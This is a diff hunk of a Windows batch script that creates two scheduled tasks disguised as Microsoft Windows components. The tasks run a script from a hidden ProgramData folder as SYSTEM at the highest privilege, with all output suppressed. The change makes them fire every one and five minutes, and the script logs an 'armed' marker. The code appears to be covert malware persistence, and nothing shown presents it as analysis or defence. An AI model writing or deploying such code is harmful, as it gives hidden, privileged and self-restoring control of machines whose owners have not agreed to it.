@@ -72,8 +72,8 @@ attrib +h "%ZD%" >nul 2>&1
 set "TASKA=\Microsoft\Windows\WinRTCS\Agent"
 set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
 set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
-schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
-schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 7 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+schtasks /Create /TN "%TASKA%" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+schtasks /Create /TN "%TASKG%" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
 schtasks /Run /TN "%TASKA%" >nul 2>&1
 echo [%DATE% %TIME%] winrtcs_armed>>"%LOG%"
 
